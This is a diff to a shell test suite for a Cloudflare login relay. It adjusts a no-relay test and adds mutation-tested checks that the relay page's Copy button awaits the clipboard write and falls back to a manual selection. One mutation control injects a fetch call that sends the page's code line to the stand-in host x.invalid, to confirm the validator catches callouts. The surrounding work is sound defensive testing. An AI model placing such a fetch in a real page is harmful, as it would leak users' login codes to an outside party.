@@ -259,7 +259,9 @@ fi
 no_leak "novault" "$OUT" "$(code_of novault)"
 
 start_fake norelay
-run_bin norelay -- --cloudflare-login --via qr
+# 1954-cfqr: the relay is ON by default (RELAY_DEFAULT_ON), so "no relay"
+# is the documented per-host retreat, an EMPTY TILLANDSIAS_CLOUDFLARE_RELAY_URL.
+run_bin norelay TILLANDSIAS_CLOUDFLARE_RELAY_URL= -- --cloudflare-login --via qr
 if [ "$RC" -ne 0 ] && grep -q '^refused:cloudflare-login:no-relay-configured$' <<<"$OUT" \
     && grep -q -- '--via loopback' <<<"$OUT" && grep -q -- '--via paste' <<<"$OUT"; then
     ok "NORELAY bin: --via qr without a relay refuses, naming --via loopback and --via paste"
@@ -394,7 +396,7 @@ else
     bad "RELAY page: missing, or it can call out / does not render code and state"
 fi
 if [ -r "$PAGE" ]; then
-    sed 's|show("ok");|show("ok"); fetch("https://x.invalid/?" + line);|' "$PAGE" >"$scratch/relay-fetch.html"
+    sed 's|show("manual");|show("manual"); fetch("https://x.invalid/?" + line);|' "$PAGE" >"$scratch/relay-fetch.html"
     if cmp -s "$PAGE" "$scratch/relay-fetch.html"; then
         bad "RELAY CONTROL fetch: the mutation did not reach"
     elif relay_page_ok "$scratch/relay-fetch.html"; then
@@ -409,6 +411,30 @@ if [ -r "$PAGE" ]; then
         bad "RELAY CONTROL csp: dropping connect-src 'none' was NOT caught"
     else
         ok "RELAY CONTROL csp: dropping connect-src 'none' is caught"
+    fi
+fi
+
+# ── the Copy button reports its outcome and falls back to a selection ──────
+copy_ok() {   # <file>: 0 when the copy is awaited, a refusal selects the line, and the outcome is shown
+    grep -q 'writeText(line).then(' "$1" || return 1
+    grep -q 'selectNodeContents' "$1" || return 1
+    grep -q 'Copied.' "$1" || return 1
+    grep -q 'press Ctrl+C' "$1" || return 1
+    return 0
+}
+if [ -r "$PAGE" ] && copy_ok "$PAGE"; then
+    ok "RELAY copy: awaited, with a select-and-Ctrl+C fallback and visible feedback"
+else
+    bad "RELAY copy: unawaited, no fallback, or no feedback"
+fi
+if [ -r "$PAGE" ]; then
+    sed 's|writeText(line).then(|writeText(line);(|' "$PAGE" >"$scratch/relay-copy.html"
+    if cmp -s "$PAGE" "$scratch/relay-copy.html"; then
+        bad "RELAY CONTROL copy: the mutation did not reach"
+    elif copy_ok "$scratch/relay-copy.html"; then
+        bad "RELAY CONTROL copy: an unawaited copy was NOT caught"
+    else
+        ok "RELAY CONTROL copy: an unawaited copy is caught"
     fi
 fi
 
